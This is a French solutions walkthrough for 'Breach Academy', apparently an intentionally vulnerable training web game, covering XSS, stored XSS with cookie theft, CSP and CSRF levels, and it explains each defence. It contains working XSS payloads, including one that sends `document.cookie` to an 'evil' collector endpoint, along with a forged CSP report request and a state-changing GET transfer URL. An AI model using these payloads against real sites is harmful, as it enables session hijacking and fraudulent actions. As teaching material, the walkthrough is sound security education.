# Solutions — Breach Academy

Solution de chaque niveau, complétée à chaque étape de `docs/PLAN.md`.
Les flags ne figurent pas ici : ils sont dérivés de `FLAG_SECRET` et changent
d'un déploiement à l'autre.

Prérequis commun : serveur lancé avec `BREACH_VULNERABLE_MODE=true` et niveau
basculé en mode **Vulnérable**.

---

## Niveau 1 — XSS réfléchie : « Le moteur de recherche bavard » (étape 2)

**Faille** : le terme cherché est réaffiché via `[innerHTML]` après
`bypassSecurityTrustHtml` (`src/app/levels/search-engine/search-level.ts`).
Une fonction `window.revealFlag()` n'existe qu'en mode vulnérable.

**Solution**
1. Ouvrir `/niveaux/recherche-bavarde`.
2. Rechercher :
   ```html
   <img src=x onerror="revealFlag()">
   ```
   ou ouvrir directement le lien piégé :
   `/niveaux/recherche-bavarde?q=%3Cimg%20src%3Dx%20onerror%3DrevealFlag()%3E`
3. L'image ne se charge pas, `onerror` s'exécute, le flag s'affiche sous la
   recherche. Le copier dans « Soumettre le flag ».

**Pièges**
- `<script>alert(1)</script>` ne marche pas : une balise `script` insérée par
  `innerHTML` n'est jamais exécutée. Il faut un attribut d'événement
  (`onerror`, `onload`, `onfocus`…).
- Raccourci : taper `revealFlag()` dans la console des DevTools fonctionne aussi
  (c'est du JavaScript exécuté dans la page).

**En mode sécurisé** : le payload s'affiche comme du texte (interpolation
`{{ }}`), `revealFlag` n'existe pas, et l'API répond 403.

---

## Niveau 2 — XSS stockée : « Le livre d'or » (étape 3)

**But** : voler le cookie de session du bot administrateur, qui contient le flag.

**En mode vulnérable** :
1. Publier un message contenant un gestionnaire d'événement qui exfiltre le cookie
   du bot vers le collecteur de l'attaquant, par exemple :
   `<img src=x onerror="fetch('/api/evil/collect?c='+document.cookie)">`.
2. Cliquer sur « Lancer la relecture du bot ». Le bot relit le livre d'or
   dans le navigateur du joueur : le serveur lui attribue une session `ba_admin`
   **non HttpOnly** (porteuse du flag), et le message est réinjecté en HTML brut
   (`innerHTML`) — le payload s'exécute dans sa session.
3. Le cookie volé apparaît dans la « console du collecteur » : il contient le flag,
   à recopier dans le formulaire.

- Le collecteur écoute sur `/api/evil/collect` (même origine) : `evil.localhost`
  de la maquette ne résout pas, viser le chemin interne.
- Raccourci : le payload peut aussi lire directement `document.cookie` une fois le
  bot lancé (c'est du JavaScript exécuté dans la vue admin).
- Une balise `<script>` injectée via `innerHTML` ne s'exécute pas : utiliser un
  attribut d'événement (`onerror`, `onload`…).

**En mode sécurisé** : le message est rendu comme du texte (interpolation `{{ }}`),
le serveur refuse tout HTML (400, validation Zod), la session du bot est `HttpOnly`
— l'attaque n'exfiltre rien et le collecteur reste vide.

## Niveau 3 — CSP : « Le mur invisible » (étape 4)

Le livre d'or du niveau 2 (mêmes messages, même bot, toujours vulnérable) est
rejoué sous une CSP posée par un middleware Nitro sur la page du niveau.

1. Garder (ou republier) le message piégé du niveau 2 :
   `<img src=x onerror="fetch('/api/evil/collect?c='+document.cookie)">`.
2. **CSP « Aucune »** : lancer la relecture du bot → le payload s'exécute, le
   collecteur reçoit le cookie. Sur ce niveau, la session du bot ne contient
   **pas** de flag (`ba_admin=session-admin-sans-flag`) : voler le cookie ne
   suffit plus, le flag se gagne par la CSP. Le collecteur est vidé à chaque
   relecture.
3. **CSP « Rapport seul »** (`Content-Security-Policy-Report-Only`) : le payload
   s'exécute toujours, mais la console CSP affiche « ⚠ signalée ·
   script-src-attr ← inline » (rapport envoyé au `report-uri`).
4. **CSP « Bloquante »** : le navigateur refuse le gestionnaire `onerror`
   (`script-src 'self'`, sans `'unsafe-inline'`) : rien n'est exfiltré, la
   console affiche « ⛔ bloquée » et **le flag apparaît** dans la console CSP.

Chaque changement de CSP recharge la page : la politique vient de l'en-tête HTTP
du document, elle ne change pas sans nouveau chargement.

Raccourci (et leçon) : un rapport de violation se forge à la main, par exemple
`POST /api/mur-invisible/csp-report?d=enforce` avec un corps
`{"csp-report":{"effective-directive":"script-src-attr","blocked-uri":"inline"}}`.
Les rapports CSP ne prouvent rien : on ne leur fait jamais confiance.

**En mode sécurisé** : la CSP bloquante est imposée et le bot relit les messages
comme du texte ; aucune violation, et le flag n'est jamais révélé (même avec un
rapport forgé).

## Niveau 4 — CSRF : « Le virement fantôme » (étape 5)

**Faille** : la fausse banque (`src/server/levels/bank.ts`, session `ba_bank`)
accepte en mode vulnérable un virement sur le **seul cookie de session**, et même
par un simple `GET` — un changement d'état sur une requête « sûre ». La page piège
est servie sur une **autre origine** (`GET /api/virement-fantome/piege`,
`src/server/routes/api/virement-fantome/piege.get.ts`) : quand la banque est sur
`http://localhost:<port>`, le piège est sur `http://127.0.0.1:<port>` (sites
différents pour le navigateur, même serveur). Elle est sous `/api` car en
`npm run dev` Analog ne sert que ce préfixe côté serveur.

Prérequis : lancer le jeu via `localhost` **ou** `127.0.0.1` (par ex.
`npm run build && npm run preview`) pour disposer des deux origines.

**Solution**
1. Ouvrir `/niveaux/virement-fantome` sur `localhost` : le compte est approvisionné
   (1000 €) et la session `ba_bank` est posée.
2. Cliquer « Ouvrir la page piège ↗ » : elle s'ouvre sur `127.0.0.1`. À son
   chargement, elle soumet un formulaire `GET` vers
   `http://localhost:<port>/api/virement-fantome/virement?beneficiaire=PIRATE_CSRF&montant=500`.
   Comme c'est une **navigation de premier plan**, le cookie `SameSite=Lax` part
   encore vers la banque : le virement s'exécute.
3. Le navigateur arrive sur le **reçu** servi par la banque, qui affiche le flag
   (« ⚠ Virement frauduleux (CSRF) »). Le compte du niveau le montre aussi.

Raccourci (et leçon) : appeler directement l'URL de virement `GET` depuis la barre
d'adresse suffit — un endpoint qui change l'état sur un `GET` est la faille même.

**En mode sécurisé** : le cookie `ba_bank` passe en `SameSite=Strict` (il ne quitte
plus le site de la banque), un virement doit être un `POST` (le `GET` renvoie 405),
l'en-tête `Origin` est vérifié côté serveur, et un **jeton anti-CSRF double submit**
est exigé — le cookie `XSRF-TOKEN` (lisible par le script, posé par la banque) est
recopié par Angular (`withXsrfConfiguration`) dans l'en-tête `X-XSRF-TOKEN`. La page
piège, incapable de lire ce cookie ni de poser cet en-tête, est rejetée (403). Un
virement **légitime** depuis la banque reste possible dans les deux modes.

## Niveau 5 — Secrets : « Le coffre qui fuit » (étape 6)

_À compléter._

## Niveau 6 — Injection de prompt : « Le chatbot trop serviable » (étape 7)

_À compléter._
